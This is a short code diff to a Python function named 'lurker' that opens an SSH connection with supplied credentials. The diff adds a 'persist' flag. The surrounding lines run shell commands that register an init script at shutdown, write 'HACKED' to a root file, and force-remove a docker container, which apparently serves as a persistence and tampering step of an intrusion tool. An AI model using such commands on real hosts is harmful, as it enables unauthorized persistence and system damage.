@@ -3,7 +3,7 @@ from socket import socket, error
 import paramiko
 from client import open_client
 
-def lurker(hostname, port, username, password):
+def lurker(hostname, port, username, password, persist=False):
 
     open_client(hostname=hostname, port=port, username=username, password=password)
 
@@ -36,6 +36,7 @@ def lurker(hostname, port, username, password):
         system("rc-update add /etc/init.d/persist/ shutdown")
         system("rc-update -u")
         system("echo HACKED > /SHADOW")
+        # if persist:
         system("docker rm -f shadow")
 
 
